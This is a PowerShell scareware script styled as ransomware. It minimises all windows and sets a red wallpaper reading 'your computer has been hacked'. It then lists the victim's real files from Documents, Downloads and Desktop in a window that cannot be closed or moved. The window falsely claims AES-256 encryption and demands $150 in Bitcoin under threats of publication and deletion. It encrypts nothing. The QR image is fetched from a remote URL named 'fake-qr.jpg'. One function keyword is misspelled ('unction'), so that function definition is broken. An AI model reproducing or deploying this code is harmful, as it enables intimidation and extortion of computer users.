Add-Type -AssemblyName PresentationFramework,PresentationCore
Add-Type -AssemblyName System.Drawing

# Function to get files from system
function Get-SystemFiles {
    $extensions = @('.heic', '.heif', '.png', '.jpg', '.jpeg', '.cr3', '.mp4', '.mov', '.mkv', 
                   '.gif', '.webp', '.tiff', '.bmp', '.svg', '.psd', '.dng', '.pdf', '.docx', 
                   '.doc', '.txt', '.rtf', '.zip', '.7zip', '.pptx', '.csv', '.xlsx', '.ppt', '.xls')
    
    $allFiles = @()
    $maxFiles = 1000
    
    # Folders to search in order
    $folders = @(
        @{Path = [Environment]::GetFolderPath("MyDocuments"); Name = "Documents"},
        @{Path = [Environment]::GetFolderPath("UserProfile") + "\Downloads"; Name = "Downloads"},
        @{Path = [Environment]::GetFolderPath("Desktop"); Name = "Desktop"}
    )
    
    foreach ($folder in $folders) {
        if ($allFiles.Count -ge $maxFiles) { break }
        
        if (Test-Path $folder.Path) {
            try {
                $files = [System.IO.Directory]::GetFiles($folder.Path, "*.*", [System.IO.SearchOption]::AllDirectories) |
                         Where-Object { $extensions -contains [System.IO.Path]::GetExtension($_).ToLower() }
                
                foreach ($file in $files) {
                    if ($allFiles.Count -ge $maxFiles) { break }
                    
                    try {
                        $fileInfo = New-Object System.IO.FileInfo($file)
                        $allFiles += [PSCustomObject]@{
                            Name = [System.IO.Path]::GetFileName($file)
                            FullPath = $file
                            Extension = [System.IO.Path]::GetExtension($file)
                            Folder = $folder.Name
                        }
                    } catch {}
                }
            } catch {}
        }
    }
    
    return $allFiles | Select-Object -First $maxFiles
}

function Hide-AllWindows {
    try {
        $shell = New-Object -ComObject "Shell.Application"
        $shell.MinimizeAll()
    } catch {}
}
# Get files for display
$systemFiles = Get-SystemFiles

unction Set-RansomWallpaper {
    $width = [System.Windows.SystemParameters]::PrimaryScreenWidth
    $height = [System.Windows.SystemParameters]::PrimaryScreenHeight
    
    $bitmap = New-Object System.Drawing.Bitmap([int]$width, [int]$height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    
    # Fill with solid red
    $graphics.Clear([System.Drawing.Color]::FromArgb(255, 200, 0, 0))
    
    # Add text
    $font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
    $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    
    $text = "您的電腦已被駭客入侵。"
    $textSize = $graphics.MeasureString($text, $font)
    $x = ($width - $textSize.Width) / 2
    $y = ($height - $textSize.Height) / 2
    
    $graphics.DrawString($text, $font, $brush, $x, $y)
    
    # Save and set as wallpaper
    $wallpaperPath = "$env:TEMP\hacked_wallpaper.bmp"
    $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
    
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    
    [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 0x01 -bor 0x02)
    
    # Cleanup
    $brush.Dispose()
    $font.Dispose()
    $graphics.Dispose()
    $bitmap.Dispose()
}


# ========== EXECUTION FLOW ==========

# Step 1: Hide all windows
Hide-AllWindows

# Step 2: Change background wallpaper
Set-RansomWallpaper

# Step 3: Wait 1 second
Start-Sleep -Seconds 1

# Step 4: Continue with the rest of the script (getting files and showing UI)
# Get files for display
$systemFiles = Get-SystemFiles


$w = New-Object System.Windows.Window
$w.Title = "WNC Computer Lockdown - 你完蛋了"
$w.Width = 1200
$w.Height = 900
$w.Topmost = $true
$w.WindowStyle = [System.Windows.WindowStyle]::SingleBorderWindow
$w.ResizeMode = [System.Windows.ResizeMode]::NoResize
$w.WindowStartupLocation = [System.Windows.WindowStartupLocation]::CenterScreen

$g = New-Object System.Windows.Controls.Grid
$g.Background = [System.Windows.Media.Brushes]::DarkRed

# Define columns: Left for text, Right for file list
$col1 = New-Object System.Windows.Controls.ColumnDefinition
$col1.Width = New-Object System.Windows.GridLength(1, 'Star')
$col2 = New-Object System.Windows.Controls.ColumnDefinition
$col2.Width = New-Object System.Windows.GridLength(400)
$g.ColumnDefinitions.Add($col1)
$g.ColumnDefinitions.Add($col2)

$title = New-Object System.Windows.Controls.TextBlock
$title.Text = "⚠️ CRITICAL SYSTEM ALERT - YOUR FILES ARE ENCRYPTED"
$title.Foreground = [System.Windows.Media.Brushes]::White
$title.FontFamily = 'Segoe UI'
$title.FontSize = 28
$title.FontWeight = [System.Windows.FontWeights]::Bold
$title.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$title.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
$title.Margin = '15,12,0,0'
$title.TextWrapping = [System.Windows.TextWrapping]::Wrap
[System.Windows.Controls.Grid]::SetColumnSpan($title, 2)
[System.Windows.Controls.Grid]::SetColumn($title, 0)

$b = New-Object System.Windows.Controls.Border
$b.Height = 3
$b.Margin = '0,52,0,0'
$b.Background = [System.Windows.Media.Brushes]::Red
$b.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Stretch
$b.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
[System.Windows.Controls.Grid]::SetColumnSpan($b, 2)
[System.Windows.Controls.Grid]::SetColumn($b, 0)

# Main scrollable container for left column
$leftScroll = New-Object System.Windows.Controls.ScrollViewer
$leftScroll.VerticalScrollBarVisibility = 'Auto'
$leftScroll.Margin = '15,70,15,20'
[System.Windows.Controls.Grid]::SetColumn($leftScroll, 0)

$leftContainer = New-Object System.Windows.Controls.StackPanel
$leftContainer.Orientation = 'Vertical'
$leftContainer.Margin = '0,0,0,0'

# ===== SECTION 1: What Happened =====
$section1 = New-Object System.Windows.Controls.Border
$section1.Background = [System.Windows.Media.Brushes]::Black
$section1.CornerRadius = '5,5,5,5'
$section1.BorderBrush = [System.Windows.Media.Brushes]::Gray
$section1.BorderThickness = '1,1,1,1'
$section1.Margin = '0,0,0,15'
$section1.Padding = '15,15,15,15'

$section1Grid = New-Object System.Windows.Controls.Grid
$section1Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = 'Auto'}))
$section1Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = '*'}))
$section1Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
$section1Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = '*'}))
$section1Grid.Margin = '0,0,0,0'

# Warning Icon
$warningIcon1 = New-Object System.Windows.Controls.TextBlock
$warningIcon1.Text = "🔒"
$warningIcon1.FontSize = 24
$warningIcon1.Foreground = [System.Windows.Media.Brushes]::Red
$warningIcon1.VerticalAlignment = 'Top'
$warningIcon1.Margin = '0,0,10,0'
[System.Windows.Controls.Grid]::SetColumn($warningIcon1, 0)
[System.Windows.Controls.Grid]::SetRow($warningIcon1, 0)

# Section 1 Title
$section1Title = New-Object System.Windows.Controls.TextBlock
$section1Title.Text = "SYSTEM ENCRYPTION DETECTED"
$section1Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
$section1Title.FontFamily = 'Segoe UI'
$section1Title.FontSize = 18
$section1Title.FontWeight = [System.Windows.FontWeights]::Bold
$section1Title.VerticalAlignment = 'Center'
[System.Windows.Controls.Grid]::SetColumn($section1Title, 1)
[System.Windows.Controls.Grid]::SetRow($section1Title, 0)

# Section 1 Content
$section1Content = New-Object System.Windows.Controls.TextBlock
$section1Content.Text = "Your documents, photos, videos, and important files have been encrypted using military-grade AES-256 encryption. They are no longer accessible without the decryption key. Any attempt to remove this software, restart your computer, or seek external help will trigger immediate permanent file deletion."
$section1Content.Foreground = [System.Windows.Media.Brushes]::White
$section1Content.FontFamily = 'Segoe UI'
$section1Content.FontSize = 13
$section1Content.TextWrapping = 'Wrap'
$section1Content.Margin = '0,10,0,0'
[System.Windows.Controls.Grid]::SetColumn($section1Content, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($section1Content, 2)
[System.Windows.Controls.Grid]::SetRow($section1Content, 1)

$section1Grid.Children.Add($warningIcon1)
$section1Grid.Children.Add($section1Title)
$section1Grid.Children.Add($section1Content)
$section1.Child = $section1Grid

# ===== SECTION 2: Recovery =====
$section2 = New-Object System.Windows.Controls.Border
$section2.Background = [System.Windows.Media.Brushes]::Black
$section2.CornerRadius = '5,5,5,5'
$section2.BorderBrush = [System.Windows.Media.Brushes]::Gray
$section2.BorderThickness = '1,1,1,1'
$section2.Margin = '0,0,0,15'
$section2.Padding = '15,15,15,15'

$section2Grid = New-Object System.Windows.Controls.Grid
$section2Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = 'Auto'}))
$section2Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = '*'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = '*'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))

# Recovery Icon
$recoveryIcon = New-Object System.Windows.Controls.TextBlock
$recoveryIcon.Text = "💰"
$recoveryIcon.FontSize = 24
$recoveryIcon.Foreground = [System.Windows.Media.Brushes]::Gold
$recoveryIcon.VerticalAlignment = 'Top'
$recoveryIcon.Margin = '0,0,10,0'
[System.Windows.Controls.Grid]::SetColumn($recoveryIcon, 0)
[System.Windows.Controls.Grid]::SetRow($recoveryIcon, 0)

# Section 2 Title
$section2Title = New-Object System.Windows.Controls.TextBlock
$section2Title.Text = "FILE RECOVERY PROCESS"
$section2Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
$section2Title.FontFamily = 'Segoe UI'
$section2Title.FontSize = 18
$section2Title.FontWeight = [System.Windows.FontWeights]::Bold
$section2Title.VerticalAlignment = 'Center'
[System.Windows.Controls.Grid]::SetColumn($section2Title, 1)
[System.Windows.Controls.Grid]::SetRow($section2Title, 0)

# Section 2 Content
$section2Content = New-Object System.Windows.Controls.TextBlock
$section2Content.Text = "We guarantee 100% file recovery upon payment. Your files have been backed up to our secure servers. Failure to pay within 6 hours will result in:"
$section2Content.Foreground = [System.Windows.Media.Brushes]::White
$section2Content.FontFamily = 'Segoe UI'
$section2Content.FontSize = 13
$section2Content.TextWrapping = 'Wrap'
$section2Content.Margin = '0,10,0,10'
[System.Windows.Controls.Grid]::SetColumn($section2Content, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($section2Content, 2)
[System.Windows.Controls.Grid]::SetRow($section2Content, 1)

# Consequences list
$consequencesGrid = New-Object System.Windows.Controls.StackPanel
$consequencesGrid.Orientation = 'Vertical'
$consequencesGrid.Margin = '25,0,0,0'

$conseq1 = New-Object System.Windows.Controls.TextBlock
$conseq1.Text = "• Price doubles to $300 USD"
$conseq1.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$conseq1.FontSize = 12
$conseq1.FontWeight = 'Bold'

$conseq2 = New-Object System.Windows.Controls.TextBlock
$conseq2.Text = "• Your files will be published online"
$conseq2.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$conseq2.FontSize = 12
$conseq2.FontWeight = 'Bold'

$conseq3 = New-Object System.Windows.Controls.TextBlock
$conseq3.Text = "• All files permanently deleted after 48 hours"
$conseq3.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$conseq3.FontSize = 12
$conseq3.FontWeight = 'Bold'

$consequencesGrid.Children.Add($conseq1)
$consequencesGrid.Children.Add($conseq2)
$consequencesGrid.Children.Add($conseq3)

[System.Windows.Controls.Grid]::SetColumn($consequencesGrid, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($consequencesGrid, 2)
[System.Windows.Controls.Grid]::SetRow($consequencesGrid, 2)

$section2Grid.Children.Add($recoveryIcon)
$section2Grid.Children.Add($section2Title)
$section2Grid.Children.Add($section2Content)
$section2Grid.Children.Add($consequencesGrid)
$section2.Child = $section2Grid

# ===== SECTION 3: QR Code Payment Panel =====
$paymentPanel = New-Object System.Windows.Controls.Border
$paymentPanel.Background = [System.Windows.Media.Brushes]::Black
$paymentPanel.CornerRadius = '5,5,5,5'
$paymentPanel.BorderBrush = [System.Windows.Media.Brushes]::Gold
$paymentPanel.BorderThickness = '2,2,2,2'
$paymentPanel.Margin = '0,0,0,15'
$paymentPanel.Padding = '20,20,20,20'

$paymentStack = New-Object System.Windows.Controls.StackPanel
$paymentStack.Orientation = 'Vertical'
$paymentStack.HorizontalAlignment = 'Center'

# Payment Panel Title
$paymentTitle = New-Object System.Windows.Controls.TextBlock
$paymentTitle.Text = "BITCOIN PAYMENT REQUIRED"
$paymentTitle.Foreground = [System.Windows.Media.Brushes]::Gold
$paymentTitle.FontFamily = 'Segoe UI'
$paymentTitle.FontSize = 22
$paymentTitle.FontWeight = [System.Windows.FontWeights]::Bold
$paymentTitle.HorizontalAlignment = 'Center'
$paymentTitle.Margin = '0,0,0,10'

# Amount Display
$amountDisplay = New-Object System.Windows.Controls.TextBlock
$amountDisplay.Text = "$150 USD (0.0021 BTC)"
$amountDisplay.Foreground = [System.Windows.Media.Brushes]::White
$amountDisplay.Background = [System.Windows.Media.Brushes]::DarkRed
$amountDisplay.FontFamily = 'Segoe UI'
$amountDisplay.FontSize = 18
$amountDisplay.FontWeight = [System.Windows.FontWeights]::Bold
$amountDisplay.HorizontalAlignment = 'Center'
$amountDisplay.Padding = '10,5,10,5'
$amountDisplay.Margin = '0,0,0,15'

# QR Code Section
$qrSection = New-Object System.Windows.Controls.Border
$qrSection.Background = [System.Windows.Media.Brushes]::White
$qrSection.BorderBrush = [System.Windows.Media.Brushes]::Gray
$qrSection.BorderThickness = '2,2,2,2'
$qrSection.Padding = '15,15,15,15'
$qrSection.Margin = '0,0,0,15'
$qrSection.HorizontalAlignment = 'Center'

$qrGrid = New-Object System.Windows.Controls.Grid
$qrGrid.Width = 250
$qrGrid.Height = 250

# QR Code Image (using WebClient to download from URL)
try {
    $webClient = New-Object System.Net.WebClient
    $qrBytes = $webClient.DownloadData("https://i.ibb.co/xqkpW0Pj/fake-qr.jpg")
    $stream = New-Object System.IO.MemoryStream($qrBytes, $false)
    $bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
    $bitmap.BeginInit()
    $bitmap.StreamSource = $stream
    $bitmap.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $bitmap.EndInit()
    
    $qrImage = New-Object System.Windows.Controls.Image
    $qrImage.Source = $bitmap
    $qrImage.Stretch = [System.Windows.Media.Stretch]::Uniform
    $qrGrid.Children.Add($qrImage)
} catch {
    # Fallback if QR code fails to load
    $qrFallback = New-Object System.Windows.Controls.TextBlock
    $qrFallback.Text = "[QR CODE IMAGE]"
    $qrFallback.Foreground = [System.Windows.Media.Brushes]::Black
    $qrFallback.FontSize = 16
    $qrFallback.HorizontalAlignment = 'Center'
    $qrFallback.VerticalAlignment = 'Center'
    $qrGrid.Children.Add($qrFallback)
}

$qrSection.Child = $qrGrid

# QR Code Label
$qrLabel = New-Object System.Windows.Controls.TextBlock
$qrLabel.Text = "Scan QR code for payment address"
$qrLabel.Foreground = [System.Windows.Media.Brushes]::LightGray
$qrLabel.FontSize = 12
$qrLabel.HorizontalAlignment = 'Center'
$qrLabel.Margin = '0,0,0,10'
$qrLabel.FontStyle = 'Italic'

# Bitcoin Address Display
$addressPanel = New-Object System.Windows.Controls.Border
$addressPanel.Background = [System.Windows.Media.Brushes]::Black
$addressPanel.BorderBrush = [System.Windows.Media.Brushes]::DarkGoldenrod
$addressPanel.BorderThickness = '1,1,1,1'
$addressPanel.Padding = '10,10,10,10'
$addressPanel.Margin = '0,0,0,10'

$addressStack = New-Object System.Windows.Controls.StackPanel

$addressTitle = New-Object System.Windows.Controls.TextBlock
$addressTitle.Text = "BITCOIN ADDRESS:"
$addressTitle.Foreground = [System.Windows.Media.Brushes]::LightGreen
$addressTitle.FontFamily = 'Consolas'
$addressTitle.FontSize = 12
$addressTitle.FontWeight = 'Bold'
$addressTitle.Margin = '0,0,0,5'

$addressValue = New-Object System.Windows.Controls.TextBlock
$addressValue.Text = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
$addressValue.Foreground = [System.Windows.Media.Brushes]::White
$addressValue.Background = [System.Windows.Media.Brushes]::DarkSlateGray
$addressValue.FontFamily = 'Consolas'
$addressValue.FontSize = 14
$addressValue.Padding = '5,3,5,3'
$addressValue.TextAlignment = 'Center'
$addressValue.FontWeight = 'Bold'

$addressStack.Children.Add($addressTitle)
$addressStack.Children.Add($addressValue)
$addressPanel.Child = $addressStack

# Time Warning
$timeWarning = New-Object System.Windows.Controls.TextBlock
$timeWarning.Text = "⏰ TIME REMAINING: 5 hours 59 minutes"
$timeWarning.Foreground = [System.Windows.Media.Brushes]::Red
$timeWarning.FontSize = 14
$timeWarning.FontWeight = 'Bold'
$timeWarning.HorizontalAlignment = 'Center'
$timeWarning.Margin = '0,10,0,0'

$paymentStack.Children.Add($paymentTitle)
$paymentStack.Children.Add($amountDisplay)
$paymentStack.Children.Add($qrSection)
$paymentStack.Children.Add($qrLabel)
$paymentStack.Children.Add($addressPanel)
$paymentStack.Children.Add($timeWarning)
$paymentPanel.Child = $paymentStack

# ===== Add all sections to left container =====
$leftContainer.Children.Add($section1)
$leftContainer.Children.Add($section2)
$leftContainer.Children.Add($paymentPanel)

$leftScroll.Content = $leftContainer

# ===== Right column - File list =====
$fileContainer = New-Object System.Windows.Controls.Border
$fileContainer.Background = [System.Windows.Media.Brushes]::Black
$fileContainer.BorderBrush = [System.Windows.Media.Brushes]::Gray
$fileContainer.BorderThickness = '1,1,1,1'
$fileContainer.Margin = '0,70,10,20'
[System.Windows.Controls.Grid]::SetColumn($fileContainer, 1)

$fileStack = New-Object System.Windows.Controls.StackPanel
$fileStack.Margin = '5,5,5,5'

# File list title
$fileTitle = New-Object System.Windows.Controls.TextBlock
$fileTitle.Text = "ENCRYPTED FILES ($($systemFiles.Count) files)"
$fileTitle.Foreground = [System.Windows.Media.Brushes]::Red
$fileTitle.FontFamily = 'Segoe UI'
$fileTitle.FontSize = 18
$fileTitle.FontWeight = [System.Windows.FontWeights]::Bold
$fileTitle.Margin = '0,0,0,10'
$fileTitle.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$fileStack.Children.Add($fileTitle)

# Folder indicators
$folderIndicators = New-Object System.Windows.Controls.StackPanel
$folderIndicators.Orientation = 'Horizontal'
$folderIndicators.HorizontalAlignment = 'Center'
$folderIndicators.Margin = '0,0,0,10'

$docIndicator = New-Object System.Windows.Controls.Label
$docIndicator.Content = "📁 Documents"
$docIndicator.Foreground = [System.Windows.Media.Brushes]::LightBlue
$docIndicator.FontSize = 11
$docIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($docIndicator)

$dlIndicator = New-Object System.Windows.Controls.Label
$dlIndicator.Content = "📥 Downloads"
$dlIndicator.Foreground = [System.Windows.Media.Brushes]::LightGreen
$dlIndicator.FontSize = 11
$dlIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($dlIndicator)

$deskIndicator = New-Object System.Windows.Controls.Label
$deskIndicator.Content = "🖥️ Desktop"
$deskIndicator.Foreground = [System.Windows.Media.Brushes]::LightGoldenrodYellow
$deskIndicator.FontSize = 11
$deskIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($deskIndicator)

$fileStack.Children.Add($folderIndicators)

# Create scroll viewer for file list
$scrollViewer = New-Object System.Windows.Controls.ScrollViewer
$scrollViewer.VerticalScrollBarVisibility = 'Auto'
$scrollViewer.Height = 650

$fileListPanel = New-Object System.Windows.Controls.StackPanel

# Add files to the list with folder-based styling
$currentFolder = ""
foreach ($file in $systemFiles) {
    if ($currentFolder -ne $file.Folder) {
        $currentFolder = $file.Folder
        
        # Add folder header
        $folderHeader = New-Object System.Windows.Controls.TextBlock
        $folderHeader.Text = "=== $currentFolder ==="
        $folderHeader.Foreground = if ($currentFolder -eq "Documents") { [System.Windows.Media.Brushes]::LightBlue }
                                   elseif ($currentFolder -eq "Downloads") { [System.Windows.Media.Brushes]::LightGreen }
                                   else { [System.Windows.Media.Brushes]::LightGoldenrodYellow }
        $folderHeader.FontWeight = [System.Windows.FontWeights]::Bold
        $folderHeader.FontSize = 12
        $folderHeader.Margin = '0,10,0,5'
        $fileListPanel.Children.Add($folderHeader)
    }
    
    # Create file entry
    $fileEntry = New-Object System.Windows.Controls.StackPanel
    $fileEntry.Orientation = 'Horizontal'
    $fileEntry.Margin = '5,2,5,2'
    
    # File icon based on extension
    $icon = switch ($file.Extension.ToLower()) {
        {$_ -in '.pdf'} { '📄' }
        {$_ -in '.doc', '.docx', '.txt', '.rtf'} { '📝' }
        {$_ -in '.xls', '.xlsx', '.csv'} { '📊' }
        {$_ -in '.ppt', '.pptx'} { '📽️' }
        {$_ -in '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'} { '🖼️' }
        {$_ -in '.mp4', '.mov', '.mkv'} { '🎬' }
        {$_ -in '.heic', '.heif', '.cr3', '.dng', '.psd'} { '📷' }
        {$_ -in '.zip', '.7zip'} { '📦' }
        default { '📁' }
    }
    
    $iconText = New-Object System.Windows.Controls.TextBlock
    $iconText.Text = $icon
    $iconText.FontSize = 12
    $iconText.Margin = '0,0,5,0'
    $fileEntry.Children.Add($iconText)
    
    $fileName = New-Object System.Windows.Controls.TextBlock
    $fileName.Text = $file.Name
    $fileName.Foreground = [System.Windows.Media.Brushes]::White
    $fileName.FontSize = 11
    $fileName.FontFamily = 'Consolas'
    $fileName.TextTrimming = 'CharacterEllipsis'
    $fileName.Width = 300
    $fileEntry.Children.Add($fileName)
    
    $statusIcon = New-Object System.Windows.Controls.TextBlock
    $statusIcon.Text = " 🔒"
    $statusIcon.Foreground = [System.Windows.Media.Brushes]::Red
    $statusIcon.FontSize = 10
    $fileEntry.Children.Add($statusIcon)
    
    $fileListPanel.Children.Add($fileEntry)
}

$scrollViewer.Content = $fileListPanel
$fileStack.Children.Add($scrollViewer)

# File count summary
$fileSummary = New-Object System.Windows.Controls.TextBlock
$fileSummary.Text = "Total encrypted files: $($systemFiles.Count) of 104,366"
$fileSummary.Foreground = [System.Windows.Media.Brushes]::Red
$fileSummary.FontSize = 12
$fileSummary.FontWeight = [System.Windows.FontWeights]::Bold
$fileSummary.Margin = '0,10,0,0'
$fileSummary.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$fileStack.Children.Add($fileSummary)

$fileContainer.Child = $fileStack

# ===== Add all elements to grid =====
$null = $g.Children.Add($leftScroll)
$null = $g.Children.Add($fileContainer)
$null = $g.Children.Add($b)
$null = $g.Children.Add($title)

# --- Non-draggable lock logic for ONE window ---
$lockReady = $false
$lockLeft  = 0.0
$lockTop   = 0.0

# Capture final startup position (after centering/layout completes)
$w.Add_ContentRendered({
    $script:lockLeft  = $w.Left
    $script:lockTop   = $w.Top
    $script:lockReady = $true
})

# If user drags window, force it back
$w.Add_LocationChanged({
    if ($script:lockReady) {
        if ($w.Left -ne $script:lockLeft -or $w.Top -ne $script:lockTop) {
            $w.Left = $script:lockLeft
            $w.Top  = $script:lockTop
        }
    }
})
# -----------------------------------------------


$w.Content = $g

$w.Add_Closing({ param($s,$e) $e.Cancel = $true })

$null = $w.ShowDialog()
